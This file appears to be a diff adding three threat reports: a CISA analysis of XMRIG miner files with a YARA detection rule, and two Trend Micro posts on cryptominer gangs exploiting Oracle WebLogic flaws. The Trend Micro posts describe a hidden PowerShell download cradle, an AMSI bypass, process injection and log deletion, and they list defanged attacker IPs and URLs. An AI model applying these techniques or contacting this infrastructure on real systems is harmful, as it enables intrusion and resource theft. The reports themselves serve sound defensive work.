@@ -1,0 +1,3235 @@
+TLP: CLEAR
+10387061.r1.v1
+2022-10-24
+Malware Analysis Report
+Notification
+This report is provided "as is" for informational purposes only. The Department of Homeland Security (DHS) does not provide any 
+warranties of any kind regarding any information contained herein. The DHS does not endorse any commercial product or service 
+referenced in this bulletin or otherwise.
+This document is marked TLP:CLEAR--Disclosure is not limited. Sources may use TLP:CLEAR when information carries minimal or no 
+foreseeable risk of misuse, in accordance with applicable rules and procedures for public release. Subject to standard copyright rules, 
+TLP:CLEAR information may be distributed without restriction. For more information on the Traffic Light Protocol (TLP), see
+http://www.cisa.gov/tlp.
+Summary
+Description
+CISA obtained four malicious files for analysis during an on-site incident response engagement at a Federal Civilian Executive Branch
+(FCEB) organization compromised by Iranian government sponsored advanced persistent threat (APT) actors.
+These files have been identified as variants of the XMRIG cryptocurrency mining software. The files include a kernel driver, two Windows
+executables, and a configuration file to control one of the executable's behavior on the network and infected host.
+For more information on the confirmed compromise, see joint CSA Iranian Government Sponsored APT Actors Compromise Federal
+Network, Deploy Crypto Miner, Credential Harvester.
+Submitted Files (4)
+11bd2c9f9e2397c9a16e0990e4ed2cf0679498fe0fd418a3dfdac60b5c160ee5 (WinRing0x64.sys)
+2ffe6509d965413d20ae859a4b4878246119159c368c945a7b466435b4e6e6df (RuntimeBroker.exe)
+673ebada19e044b1ddb88155ad99188ba403cbb413868877b3ce0af11617bcfb (wuaucltservice.exe)
+b511c0f45d2a1def0985fa631d1a6df5f754bc7c5f53105cc97c247b97ff0f56 (config.json)
+Findings
+11bd2c9f9e2397c9a16e0990e4ed2cf0679498fe0fd418a3dfdac60b5c160ee5
+Details
+Name WinRing0x64.sys
+Size 14544 bytes
+Type PE32+ executable (native) x86-64, for MS Windows
+MD5 0c0195c48b6b8582fa6f6373032118da
+SHA1 d25340ae8e92a6d29f599fef426a2bc1b5217299
+SHA256 11bd2c9f9e2397c9a16e0990e4ed2cf0679498fe0fd418a3dfdac60b5c160ee5
+SHA512 ab28e99659f219fec553155a0810de90f0c5b07dc9b66bda86d7686499fb0ec5fddeb7cd7a3c5b77dccb5e865f2715c
+2d81f4d40df4431c92ac7860c7e01720d
+ssdeep 192:nqjKhp+GQvzj3i+5T9oGYJh1wAoxhSF6OOoe068jSJUbueq1H2PIP0:qjKL+v/y+5TWGYOf2OJ06dUb+pQ
+Entropy 6.266030
+CISA MAR-10387061.r1.v1.CLEAR
+TLP: CLEAR
+1 of 8
+TLP: CLEAR
+Antivirus
+No matches found.
+YARA Rules
+No matches found.
+ssdeep Matches
+No matches found.
+PE Metadata
+Compile Date 2008-07-26 09:29:37-04:00
+Import Hash
+d41fa95d4642dc981f10de36f4dc8cd7
+Company Name OpenLibSys.org
+File Description WinRing0
+Internal Name WinRing0.sys
+Legal Copyright Copyright (C) 2007-2008 OpenLibSys.org. All rights reserved.
+Original Filename WinRing0.sys
+Product Name WinRing0
+Product Version 1.2.0.5
+PE Sections
+MD5
+1002ff0ee92dc9b20d657e288433200f
+1c3d5bb2285dafcf3b7746bf717c1a51
+08362d1269d5a5ef4e7560cab993590d
+043c46095689123e1f5be96c109c2f46
+077af14197899077aa36d2c72ba1773f
+ba375d2de342e7d7a93487a35ea5d36d
+5459c1fdb222b651d36692c4ca5df895
+Description
+Name
+header
+.text
+.rdata
+.data
+.pdata
+INIT
+.rsrc
+Raw Size
+Entropy
+1024
+2048
+512
+512
+512
+1024
+1024
+2.311532
+5.391023
+3.284507
+0.301407
+0.857623
+3.057208
+3.126728
+This Windows driver file is a variant of the XMRIG cryptocurrency mining software.
+b511c0f45d2a1def0985fa631d1a6df5f754bc7c5f53105cc97c247b97ff0f56
+Tags
+miner
+Details
+Name
+config.json
+Size 4455 bytes
+Type
+JSON data
+MD5 910350d4f72b7b25f4fbecfc08d815cd
+SHA1 a95fe63bbade63711cdfd012805d7370cbda3d76
+SHA256 b511c0f45d2a1def0985fa631d1a6df5f754bc7c5f53105cc97c247b97ff0f56
+SHA512 aeaff1d8728ec5f2471bc6ed7671ca47c829fe20e422ecbd88c727935fbd6cf1f3f4355a20e976e2bfd8f9b24e52ab151
+b2b3a8b562efb102b2c9b063628efa3
+ssdeep 96:EePpTFycC1d1FwKQjHKufLKzKCc1DMuIlz3OO7eknyyw10AwJqQ4:/FqdjwKQjHKQLKzKCSMJz3OO7eknyyJS
+Entropy 4.380124
+Antivirus
+ESET Win64/CoinMiner.RO potentially unwanted application
+CISA MAR-10387061.r1.v1.CLEAR
+TLP: CLEAR
+2 of 8
+TLP: CLEAR
+Quick Heal
+JSON.Miner.42626
+YARA Rules
+No matches found.
+ssdeep Matches
+No matches found.
+Relationships
+b511c0f45d...
+Used_By
+673ebada19e044b1ddb88155ad99188ba403
+cbb413868877b3ce0af11617bcfb
+Description
+The four screenshots depicting config.json prove that it is used by the Windows executable
+673ebada19e044b1ddb88155ad99188ba403cbb413868877b3ce0af11617bcfb. Furthermore the contents of the file and the
+network traffic reveal a connection to the cryptocurrency mining location "mine.c3pool.com:80". Also present are user agent strings,
+from the network traffic, showing a connection attempt to a cryptocurrency mining location with a login ID and password. The user
+agent strings further prove that this is a configuration file for a variant of the XMRIG cryptocurrency mining software.
+Screenshots
+Figure 1 - This screenshot shows a select excerpt of the config.json file.
+Figure 2 - This screenshot shows the Windows executable,
+673ebada19e044b1ddb88155ad99188ba403cbb413868877b3ce0af11617bcfb, in Process Monitor, looking for, and not finding,
+the config.json file in the same working directory.
+Figure 3 - This screenshot shows the Windows executable,
+673ebada19e044b1ddb88155ad99188ba403cbb413868877b3ce0af11617bcfb, in Process Monitor, looking for, finding, and
+reading data from the config.json file.
+CISA MAR-10387061.r1.v1.CLEAR
+TLP: CLEAR
+3 of 8
+TLP: CLEAR
+Figure 4 - This screenshot shows some of the contents of the config.json file appearing in the network protocol analyzer, SmartSniff.
+The network traffic was captured while running the Windows executable,
+673ebada19e044b1ddb88155ad99188ba403cbb413868877b3ce0af11617bcfb.
+2ffe6509d965413d20ae859a4b4878246119159c368c945a7b466435b4e6e6df
+Tags
+miner
+trojan
+Details
+Name RuntimeBroker.exe
+Size 38400 bytes
+Type PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows
+MD5 4d947b502bae40e04fbab25f099dece1
+SHA1 5509f5481a73241b039392cbef6dd878a909764a
+SHA256 2ffe6509d965413d20ae859a4b4878246119159c368c945a7b466435b4e6e6df
+SHA512 aacefa4bf75584dd9855ed14a7bc217cb1722d981e019e8d70401151910b6a094f0f45b3148bbec432ba073ce9d668
+1eb61eb60e7c66c13043a40224830309be
+ssdeep 768:iEHiUk59kkkkEvkkIhswkkkkkkkkkkkkkskRQM41v1SbpCdVDZcnMTeMt6zGcoBC:iEHidkkkkOkkIhswkkkkkkkkkkkkk
+slg
+Entropy 5.176212
+Antivirus
+Adaware
+Trojan.GenericKD.38969250
+AhnLab
+Trojan/Win.Mamson
+Avira
+TR/CoinMiner.csytl
+Bitdefender
+Trojan.GenericKD.38969250
+ESET
+a variant of Generik.IMOMUMJ trojan
+Emsisoft
+Trojan.GenericKD.38969250 (B)
+IKARUS Trojan.MSIL.Inject
+K7 Trojan ( 005454ce1 )
+McAfee Generic spy.q
+NANOAV
+Trojan.Win32.CoinMiner.jsmesj
+Symantec Process timed out
+TACHYON Trojan/W32.DN-Agent.38400.BA
+Trend Micro Coinmin.214F6CC7
+CISA MAR-10387061.r1.v1.CLEAR
+TLP: CLEAR
+4 of 8
+TLP: CLEAR
+Trend Micro HouseCall Coinmin.214F6CC7
+VirusBlokAda
+Trojan.Mamson
+YARA Rules
+No matches found.
+ssdeep Matches
+No matches found.
+PE Metadata
+Compile Date 2022-01-08 01:52:02-05:00
+Import Hash
+f34d5f2d4577ed6d9ceec516c1f5a744
+Company Name Microsoft Corporation
+File Description Runtime Broker Service
+Internal Name RuntimeBrokerService.exe
+Legal Copyright © Microsoft Corporation. All rights reserved.
+Original Filename RuntimeBroker.exe
+Product Name Microsoft® Windows® Operating System
+Product Version 10.0.17763.1697
+PE Sections
+MD5
+37f2cc0358c95f8e74ff8bcc41861dd5
+960129d9cf14c368fc1ddf46dea96f0a
+2943cf44463ce8f9a5a567b87f79ed9e
+c87ace5902b9768e6ed8534609bf51f2
+Packers/Compilers/Cryptors
+Microsoft Visual C# v7.0 / Basic .NET
+Description
+Name
+header
+.text
+.rsrc
+.reloc
+Raw Size
+Entropy
+512
+35328
+2048
+512
+2.605893
+5.296196
+3.823821
+0.081539
+This file is a Windows executable that has been identified as a variant of the XMRIG cryptocurrency miner.
+673ebada19e044b1ddb88155ad99188ba403cbb413868877b3ce0af11617bcfb
+Tags
+adware
+miner
+trojan
+Details
+Name wuaucltservice.exe
+Size 4866560 bytes
+Type PE32+ executable (console) x86-64, for MS Windows
+MD5 6b8d058db910487ff90fe39e1dcd93b8
+SHA1 b0c95c1236ed9cf7710bea184c99caf74996a2f0
+SHA256 673ebada19e044b1ddb88155ad99188ba403cbb413868877b3ce0af11617bcfb
+SHA512 ece19ec20ef3576a05ddb7c284f069324453230c5d6d035ab0ab1bd7029f560246087e0b907e7cc95fcb3259e6d381
+68fcdc52f9c06322f73fdbd354d5b5c571
+ssdeep 98304:+jcjHdrLwMr9pgRIqwSL+rPdsGMlPsSlrfL+/:AaqwSqrPmlPs+X+/
+Entropy 6.623136
+Antivirus
+Adaware Gen:Variant.Application.Miner.24
+AhnLab Win-Trojan/Miner3.Exp
+CISA MAR-10387061.r1.v1.CLEAR
+TLP: CLEAR
+5 of 8
+TLP: CLEAR
+Antiy GrayWare/Win64.CoinMiner.xmr
+Avira HEUR/AGEN.1213073
+Bitdefender Gen:Variant.Application.Miner.24
+ClamAV Win.Coinminer.Generic-7151253-0
+Comodo ApplicUnwnt
+Cyren W64/ABRisk.FSTE-4228
+ESET
+a variant of Win64/CoinMiner.QG potentially unwanted application
+IKARUS Trojan.Win32.CoinMiner
+McAfee
+Trojan-CoinMiner.e
+NANOAV
+Trojan.Win64.Miner.jmqhfi
+Sophos App/XMRigM-A
+Symantec Unavailable (production)
+VirusBlokAda
+Trojan.Miner
+Zillya!
+Tool.BitCoinMiner.Win32.41498
+YARA Rules
+rule CISA_10372500_02 : miner XMRIG
+{
+   meta:
+ Author = "CISA Code & Media Analysis"
+ Incident = "10372500"
+ Date = "2022-03-03"
+ Last_Modified = "20220307_1600"
+ Actor = "n/a"
+ Category = "Miner"
+ Family = "XMRIG"
+ Description = "Detects XMRIG Miner samples"
+ MD5_1 = "f0cf1d3d9ed23166ff6c1f3deece19b4"
+ SHA256_1 = "0663d70411a20340f184ae3b47138b33ac398c800920e4d976ae609b60522b01"
+   strings:
+ $s0 = { 58 4D 52 69 67 20 36 2E }
+ $s1 = { 63 6F 6E 66 69 67 5C 78 6D 72 69 67 2E 6A 73 }
+ $s2 = { 78 6D 72 69 67 2D 63 75 64 61 2E 64 6C 6C }
+ $s3 = { 6C 69 62 78 6D 72 69 67 2D }
+ $s4 = { 63 75 64 61 2E 73 6F }
+ $s5 = { 69 73 20 70 72 6F 67 72 61 6D 20 63 61 6E 6E 6F }
+ $s6 = { 74 20 62 65 20 72 75 6E 20 69 6E 20 44 4F 53 }
+   condition:
+ all of them
+}
+ssdeep Matches
+No matches found.
+PE Metadata
+Compile Date 2021-10-20 13:43:06-04:00
+Import Hash 9b323a22fbcf8802b8268ed760cc85aa
+Company Name Microsoft Corporation
+File Description Windows Update Service
+Internal Name None
+Legal Copyright © Microsoft Corporation. All rights reserved.
+Original Filename wuaucltservice.exe
+Product Name Microsoft® Windows® Operating System
+CISA MAR-10387061.r1.v1.CLEAR
+TLP: CLEAR
+6 of 8
+TLP: CLEAR
+Product Version 10.0.19041.1237
+PE Sections
+MD5
+b48f98951d4fc6e61ed06147029713ba
+a83dcac6012f92ddb97471e34f4ae19c
+7f889bd1211726b944da89c3fa249052
+a5f7ed40314674630401fea1c744ef7d
+a38db173e6ebe8ed8f22f33ffa004325
+Name
+header
+.text
+.rdata
+.data
+.pdata
+18f65216c5666a43cad3f4bbe2f84486
+_RANDOMX
+c14f9aad5e95192cd7523ba6675549fd
+325b24832a46de54de997ee69f8069ca
+409bf3f918f2402291cb56c2e9354b47
+_SHA3_25
+_TEXT_CN
+_TEXT_CN
+9d77890e82e946393d0907b5e44219b1
+_RDATA
+323dedb863a77ca5f641649f5058c8b8
+cdb933128453430bcb33f5836ea587ae
+.rsrc
+.reloc
+Packers/Compilers/Cryptors
+Microsoft Visual C++ 8.0
+Relationships
+Raw Size
+Entropy
+1024
+3362304
+1259520
+64000
+125952
+3584
+2560
+8192
+4608
+512
+1536
+32768
+3.965273
+6.514644
+6.131511
+4.111711
+6.236102
+5.765764
+4.583159
+6.007560
+6.047924
+2.415704
+3.939508
+5.456217
+673ebada19...
+Used
+b511c0f45d2a1def0985fa631d1a6df5f754bc
+7c5f53105cc97c247b97ff0f56
+Description
+This file is a Windows executable that has been identified as a variant of the XMRIG cryptocurrency miner.
+Relationship Summary
+b511c0f45d...
+Used_By
+673ebada19...
+Used
+673ebada19e044b1ddb88155ad99188ba403
+cbb413868877b3ce0af11617bcfb
+b511c0f45d2a1def0985fa631d1a6df5f754bc
+7c5f53105cc97c247b97ff0f56
+Conclusion
+The four samples, submitted to CISA, could have negative impact on performance of the infected computer due to their parasitic nature,
+i.e., siphoning target system resources to mine cryptocurrency for a remote threat actor.
+Recommendations
+CISA recommends that users and administrators consider using the following best practices to strengthen the security posture of their
+organization's systems. Any configuration changes should be reviewed by system owners and administrators prior to implementation to
+avoid unwanted impacts.
+Maintain up-to-date antivirus signatures and engines.
+Keep operating system patches up-to-date.
+Disable File and Printer sharing services. If these services are required, use strong passwords or Active Directory authentication.
+Restrict users' ability (permissions) to install and run unwanted software applications. Do not add users to the local administrators
+group unless required.
+Enforce a strong password policy and implement regular password changes.
+Exercise caution when opening e-mail attachments even if the attachment is expected and the sender appears to be known.
+Enable a personal firewall on agency workstations, configured to deny unsolicited connection requests.
+CISA MAR-10387061.r1.v1.CLEAR
+TLP: CLEAR
+7 of 8
+TLP: CLEAR
+Disable unnecessary services on agency workstations and servers.
+Scan for and remove suspicious e-mail attachments; ensure the scanned attachment is its "true file type" (i.e., the extension matches
+the file header).
+Monitor users' web browsing habits; restrict access to sites with unfavorable content.
+Exercise caution when using removable media (e.g., USB thumb drives, external drives, CDs, etc.).
+Scan all software downloaded from the Internet prior to executing.
+Maintain situational awareness of the latest threats and implement appropriate Access Control Lists (ACLs).
+Additional information on malware incident prevention and handling can be found in National Institute of Standards and Technology
+(NIST) Special Publication 800-83, "Guide to Malware Incident Prevention & Handling for Desktops and Laptops".
+Contact Information
+1-888-282-0870
+CISA Service Desk (UNCLASS)
+CISA SIPR (SIPRNET)
+CISA IC (JWICS)
+CISA continuously strives to improve its products and services. You can help by answering a very short series of questions about this
+product at the following URL: https://us-cert.cisa.gov/forms/feedback/
+Document FAQ
+What is a MIFR? A Malware Initial Findings Report (MIFR) is intended to provide organizations with malware analysis in a timely
+manner. In most instances this report will provide initial indicators for computer and network defense. To request additional analysis,
+please contact CISA and provide information regarding the level of desired analysis.
+What is a MAR? A Malware Analysis Report (MAR) is intended to provide organizations with more detailed malware analysis acquired
+via manual reverse engineering. To request additional analysis, please contact CISA and provide information regarding the level of
+desired analysis.
+Can I edit this document? This document is not to be edited in any way by recipients. All comments or questions related to this
+document should be directed to the CISA at 1-888-282-0870 or CISA Service Desk.
+Can I submit malware to CISA? Malware samples can be submitted via three methods:
+Web: https://malware.us-cert.gov
+E-Mail: submit@malware.us-cert.gov
+FTP: ftp.malware.us-cert.gov (anonymous)
+CISA encourages you to report any suspicious activity, including cybersecurity incidents, possible malicious code, software
+vulnerabilities, and phishing-related scams. Reporting forms can be found on CISA's homepage at www.cisa.gov.
+TLP: CLEAR
+CISA MAR-10387061.r1.v1.CLEAR
+8 of 8
+www.trendmicro.com /en_us/research/23/e/8220-gang-evolution-new-strategies-adapted.html
+8220 Gang Evolves With New Strategies
+⋮ 2023/5/16
+Exploits & Vulnerabilities
+We observed the threat actor group known as “8220 Gang” employing new strategies for their respective
+campaigns, including exploits for the Linux utility “lwp-download” and CVE-2017-3506, an Oracle
+WebLogic vulnerability.
+By: Sunil Bharti May 16, 2023 Read time: 4 min (1209 words)
+8220 Gang (also known as “8220 Mining Group,” derived from their use of port 8220 for command and
+control or C&C communications exchange) has been active since 2017 and continues to scan for
+vulnerable applications in cloud and container environments. Researchers have documented this group
+targeting Oracle WebLogic, Apache Log4j, Atlassian Confluence vulnerabilities, and misconfigured
+Docker containers to deploy cryptocurrency miners in both Linux and Microsoft Windows hosts. The
+group was documented to have used Tsunami malware, XMRIG cryptominer, masscan, and spirit, among
+other tools in their campaigns.
+Looking at other researchers’ documentation on the gang’s recent activities, it appears as if the threat
+actor has been active in recent months. This article explores a recent attack observed exploiting the
+Oracle WebLogic vulnerability CVE-2017-3506 captured by one of our honeypots. This vulnerability, with
+a CVSS score of 7.4, impacts the WLS Security Component of Oracle WebLogic, and when exploited can
+1/9
+enable attackers to execute arbitrary commands through an HTTP request remotely with a specifically
+crafted XML document. This allows attackers to gain unauthorised access to sensitive data or
+compromise the entire system.
+Entry point
+Figure 1. Exploiting CVE-2017-3506
+Attackers exploited the HTTP URI (Uniform Resource Identifier) "wls-wsat/CoordinatorPortType" as an
+entry point to target an Oracle WebLogic server leveraging the CVE-2017-3506 vulnerability.
+Figure 2. Post request to vulnerable resource
+On entry, 8220 Gang delivered a PowerShell script that downloads and creates other dropper files using
+the said six-year old vulnerability. In recent attacks, we also observed the group using “lwp-download,” a
+Linux utility for downloading a file specified by the URL. In this entry, we observed the use of this utility
+also targeting Windows systems.
+2/9
+Figure 3. Use of the lwp-download utility
+Infection routine
+The attack payload executes a PowerShell command encoded using Base64. Upon decoding, it executes
+a command that opens a hidden PowerShell window (-NonI -W Hidden) with no profile loaded (-NoP),
+and bypasses execution policies (-Exec Bypass). The decoded command downloads and executes a
+PowerShell script from http[:]//185[.]17[.]0[.]199/bypass.ps1 without displaying any visible output to the
+user. The Base64-encoded string downloads a PowerShell script “bypass.ps1.”
+Figure 4. Attack payload
+Figure 5. URL after Base64 decoding
+Analysis of bypass.ps1
+3/9
+Figure 6. Process flow of bypass.ps1
+The PowerShell script decodes multiple Base64-encoded byte arrays to create another obfuscated
+PowerShell script in memory and executes it using “iex” (Invoke-Expression) commandlet.
+4/9
+Figure 7. Contents of the bypass.ps1 PowerShell script
+All the variables assigned to byte arrays contain Base64-encoded strings (in this case, the $c byte array).
+These byte arrays are used later in the script for deobfuscation purposes. Once computation is done for
+the $cc variable, it stores the decoded value of the $c byte array, which is the PowerShell script that gets
+executed in memory without writing the script on the disk. Decoding the $c variable using ASCII, the
+result is identified as the $cc variable and executes the PowerShell script.
+The new PowerShell script performs the following tasks:
+1.      It disables the AMSI detection. The code sets the value of “amsiInitFailed” field from
+<System.Management.Automation.AmsiUtils> class to “True” to achieve AMSI unhooking so that no
+scanning action will be done for the current process. To update the value of “amsiInitFaild,” it uses .NET
+reflection to assign a value of “True,” as observed in the bypass command.
+Figure 8. AMSI detection bypass
+2.      After disabling AMSI detection, it defines the path to write the malicious binary file into the Windows
+“temp” directory.
+Figure 9. Malicious binary path
+3.      Next, it writes the binary file in the specified in the “$eXE_PaTh” variable. This code section
+decodes the Base64 string into a byte array, which is a binary code, and uses .Net class System.IO to
+write the binary file on the disk.
+5/9
+Figure 10. Binary file write to disk
+4.       At the end of the script, the PowerShell executes the newly written binary file in the Windows
+“temp” directory using the “-WindowStyle Hidden” parameter in the command without displaying any user
+interface.
+Figure 11. Binary execution
+The file "Winscp-setup-1867.exe" is responsible for downloading the file "Ebvjmba.dat" by continuously
+sending a GET request to its server http[:]//79[.]137[.]203[.]156/Ebvjmba.dat. After executing Winscp-
+setup-1867.exe, a DLL file contacts the file server to download the DAT file dropper from
+79[.]137[.]203[.]156, which is an IP address we determined to be the C&C server. The DLL file uses the
+.NET framework's “HttpClient” class to send an HTTP GET request to the specified asset URL.
+Figure 12. Function that downloads the DAT file using .net code from the dissembler
+Figure 13. Network traffic capture of file download
+This dropper only has a Base64-encoded string of a binary code in reverse to evade detection. 
+6/9
+Figure 14. Binary in reverse (top) and when decoded (bottom)
+Figure 15. Function reversing the byte array to form the correct binary
+The newly created .dll file is an encrypted resource file that is injected into the MS Build process. The file
+is meticulously obfuscated, adding an extra layer of complexity for analysts. After inspecting the process’
+memory, we found that the configuration information of the injected payload is Base64-encoded and the
+new process communicates with one of the three C&Cs using TCP ports 9090, 9091, or 9092 to
+download a cryptocurrency miner:
+179[.]43[.]155[.]202
+work[.]letmaker[.]top
+su-94[.]letmaker[.]top
+7/9
+Figure 16. Process injection into msbuild.exe. Screenshot taken with Trend Vision One™
+Conclusion
+lwp-download is a Linux utility present in a number of platforms by default, and 8220 Gang making this a
+part of any malware routine can affect a number of services even if it were reused more than once.
+Considering the threat actor’s tendency to reuse tools for different campaigns and abuse legitimate tools
+as part of the arsenal, organizations’ security teams might be challenged to find other detection and
+blocking solutions to fend off attacks that abuse this utility.
+Abuse of lwp-download might be expected in the short term for compromise and targeting of other
+platforms. Despite reusing old tools and C&C servers, the gang has started targeting Windows systems,
+and using new file and C&C servers to evade previous detections. Moreover, while it would also initially
+seem counterintuitive to use a six-year-old security gap in an attack, the malicious actor’s scanning
+activity could have shown systems still vulnerable to the exploit.
+Considering these developments, we find 8220 Gang as a threat to be reckoned with despite other
+researchers describing them as “low-level script kiddies,” and that organizations still have to work on
+catching up when it comes to updating their security systems. In the group’s previous deployments,
+earlier scripts they used were simple, unable to evade detection, and were easy to analyze. Over time, it
+included significantly damaging pieces of malware (such as Tsunami malware) in respective campaigns.
+We will continue monitoring this group and their respective deployments for analysis, detection, and
+blocking.
+Trend Micro solutions
+Trend Cloud One™ - Endpoint Security and Workload Security protect endpoints, servers, and cloud
+workloads through unified visibility, management, and role-based access control. These services provide
+specialized security optimized for your diverse endpoint and cloud environments, which eliminate the cost
+and complexity of multiple point solutions.
+Indicators of Compromise (IOCs)
+URLs and IPs
+http[:]//79[.]137[.]203[.]156/Ebvjmba.dat
+8/9
+http[:]//185[.]17[.]0[.]19/bypass.ps1
+http[:]//185[.]17[.]0[.]19/Nmfwg.png
+185[.]17[.]0[.]19
+194[.]38[.]23[.]170
+201[.]71[.]165[.]153
+179[.]43[.]155[.]202
+Work[.]letmaker[.]top
+su-94[.]letmaker[.]top
+MITRE ATT&CK
+Tags
+9/9
+A Post-exploitation Look at Coinminers Abusing WebLogic Vulnerabilities
+trendmicro.com/en_us/research/22/i/a-post-exploitation-look-at-coinminers-abusing-weblogic-vulnerab.html
+September 14, 2022
+Exploits & Vulnerabilities
+This blog entry details how Trend Micro Cloud One™ – Workload Security and Trend Micro Vision One™ effectively
+detected and blocked the abuse of the CVE-2020-14882 WebLogic vulnerability in affected endpoints.
+By: Sunil Bharti September 14, 2022 Read time: 7 min (1821 words)
+We have recently observed malicious actors exploiting both recently disclosed and older Oracle WebLogic Server
+vulnerabilities to deliver cryptocurrency-mining malware. Oracle WebLogic Server is typically used for developing and
+deploying high-traffic enterprise applications on cloud environments and engineered and conventional systems.
+One of the older vulnerabilities that is still being actively exploited by malicious actors is CVE-2020-14882, a remote code
+execution (RCE) vulnerability that takes advantage of improper input validation in Oracle WebLogic Server. This
+vulnerability affects versions 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0, and 14.1.1.0.0, and can be exploited by a remote
+unauthenticated attacker via sending a crafted HTTP request to the victim server resulting in RCE. It also has a CVSS v3.0
+score of 9.8.
+Though we have observed that many malicious actors are using this vulnerability to deploy different malware families, this
+blog will focus on Kinsing malware activity. Based on our analysis, most of the exploits did not show special characteristics
+or features. However, we have observed that the downloaded shell and Python scripts went through a lengthy list of actions,
+including disabling basic operating system (OS) security features such as Security-Enhanced Linux (SELinux), watchdog
+timers, and iptables, and disabling cloud service provider’s agents.
+This blog entry will detail how Trend Micro Cloud One™ – Workload Security and Trend Micro Vision One™ effectively
+detected and blocked the abuse of the CVE-2020-14882 WebLogic vulnerability in affected endpoints.
+Technical analysis
+Despite being an older vulnerability, malicious actors are still actively weaponizing CVE-2020-14882 to gain a foothold in
+victim organizations. Figure 1 shows the active attempt to exploit the vulnerability, which our intrusion prevention system
+(IPS) detected from October 31, 2020, to July 27, 2022.
+1/13
+Figure 1. IPS detection count of the CVE-2020-14882 vulnerability exploitation from Oct. 31, 2020 to July 27, 2022
+Using Workload Security to detect WebLogic vulnerability exploitation
+Figure 2. Kinsing malware infection chain
+Workload Security’s correlation of telemetry and detections provided the initial security context in this campaign, which
+allowed security teams and analysts to track and monitor the malicious actor’s activities.
+The following Workload Security modules worked to detect the exploitation of CVE-2020-14882 on vulnerable systems:
+Intrusion prevention system module
+2/13
+Workload Security’s intrusion prevention system module can tap into incoming traffic and effectively block and detect
+malicious network traffic. This module includes multiple IPS rules that can block the vulnerability exploitation of the
+WebLogic server. One of these is IPS rule 1010590 - Oracle WebLogic Server Remote Code Execution Vulnerabilities (CVE-
+2020-14882, CVE-2020-14750 and CVE-2020-14883), which can detect and block the exploitation of vulnerabilities
+assigned to both CVE-2020-14882 and CVE-2020-14883.
+Figure 3. IPS detection of the vulnerability exploitation
+3/13
+Figure 4. Payload data captured by the IPS rule
+In figure 4, the malicious actor sent a crafted request that attempted to access the console.portal resource under the
+“images” directory. The “%252e%252e” is a double URL-encoded string of the “..” directory traversal pattern. Because the
+class managing the targeted resource did not validate the input, it automatically computed the code that the attacker
+provided. In this case, the attacker forced the server to read the contents of the wb.xml file, which downloaded a shell script
+with the following contents:
+Antimalware module
+Figure 5. The contents of the wb.xml file
+This module provides real-time protection against the exploitation of this vulnerability using behavior-monitoring features. 
+4/13
+Figure 6. Antimalware (AM) event of a shell script running on Java
+Web reputation module
+Figure 7. AM event of Kinsing malware detection
+The web reputation module protects systems against web threats by blocking access to malicious URLs. In our investigation,
+this module immediately identified and blocked the wb.sh script’s attempt to download the Kinsing malware.
+5/13
+Figure 8. The web reputation module blocked the download of the Kinsing malware.
+Activity monitoring module
+This module can detect process, file, and network activities on endpoints that are running the Cloud One Workload Security
+solution. As seen on figure 13, the activity monitoring module detected the Java process that was attempting to open a bash
+shell.
+Figure 9. The activity monitoring module detected the Java process that tried to open a bash shell.
+A closer look at the WebLogic vulnerability exploitation using Trend Micro Vision One and Trend
+Micro Cloud One
+In our investigation of this Kinsing campaign, Trend Micro Vision One provided real-time details into the paths and events
+related to this attack. This section provides insights on the activities performed by the downloaded shell script, the
+detections provided by the Trend Micro Cloud One and Trend Micro Vision One solutions, and how the said solutions
+provide information on every step of the malware's behavior.
+Trend Micro Cloud One
+After the successful exploitation of the vulnerability, the wb.sh file was downloaded into the host machine. In infected
+machines that do not run Workload Security and Vision One, it would attempt to perform the following malicious actions:
+1.     The script would check if the “/tmp/zzza”file was present, which would then trigger the script to stop.Otherwise, it
+would create an empty file and would perform the other actions. It is a flag used to verify that two or more instances are not
+running on the same host. This file can also be used to stop further infections if created manually.
+6/13
+2.     The script would increase the resource limit using the “ulimit” command and remove the /var/log/syslog file. 
+Figure 10. Detection of “/tmp/zzza” file creation
+3.     It would make multiple files mutable so that it can update them. 
+Figure 11. Detection of the /var/log/syslog file deletion
+Click to enlarge
+4.     It would also disable multiple security features within the system.
+Figure 12. Detection of attribute modification of “/etc/crontab”
+Click to enlarge
+7/13
+Figure 13. Telemetry detection of the “disable apparmor” command (Click to enlarge)
+5.     It would disable ”alibaba,” ”bydo,” and “qcloud” cloud service agents.
+Figure 14. Disabled alibaba, bydo and qcloud cloud service agents
+6.     Like other cryptocurrency-mining malware, it would start removing or killing off other cryptocurrency miners’
+processes within the infected system.
+Click to enlarge
+Figure 15. Detection of cryptominers’ killing of other competing cryptominers’ processes (Click to enlarge)
+7.     It would also remove some Docker images that belonged to other cryptocurrency-mining malware.
+8/13
+Figure 16. Removal of competing cryptominers’ Docker images (Click to enlarge)
+8.     Until this point, the script worked as a stager — it would remove the files and processes that were related to other
+cryptominers and malware families. It would also disable security features and would modify the attributes of important
+files so that they can be manipulated. After the script performs all these steps, it would then download the Kinsingmalware.
+Figure 17. Downloading the Kinsing malware (Click to enlarge)
+9.     It would check if the user was root or not and would then select the path and utility (wget and curl) to download the
+malicious binary.
+Click to enlarge
+Figure 18. Telemetry detection of the downloaded Kinsing malware (Click to enlarge)
+10.     It would then create a cronjob to download the wb.sh script.
+9/13
+Figure 19. Creation of cronjob to download the wb.sh script (Click to enlarge)
+Observed attack techniques (OATs)
+Observed attack techniques (OATs) are generated from individual events that provide security value. To investigate possible
+attempts of exploitation using this vulnerability, analysts can look for these OAT IDs from many other helper OAT triggers
+that can indicate suspicious activities on the affected host.
+Trend Micro Vision One Workbench app
+Figure 20. List of detected OATs (Click to enlarge)
+The Trend Micro Vision One Workbench app helps analysts see the significant correlated events that are intelligently based
+on the occurrences that happened throughout the entire fleet of workloads.
+10/13
+Figure 21. Workbench app detection
+The left side of figure 25 shows the summarized sequence of events. Meanwhile, security analysts can view the different
+fields of interest that are considered important and provide security value on the right side. The app allows security teams
+to see compromised assets and isolate those that can be potentially affected while patching and mitigation procedures are in
+progress.
+Execution profile
+Execution profile is a Trend Micro Vision One feature that generates graphs for security defenders. Fields like
+“processCmd” and “objectCmd’ can be expanded from the search app or the threat hunting app to look for different
+activities in any given period. These activities include process creation, file creation, and inbound and outbound network
+activity.
+If “Check Execution Profile” is selected, a security analyst can go through the extensive list of actions that a malicious actor
+has performed.
+Figure 22. Vision One dashboard showing the execution profile function (Click to enlarge)
+Threat hunting queries
+11/13
+To hunt down potential malicious activity within the environment, security analysts can use the following queries using the
+Trend Micro Vision One search app:
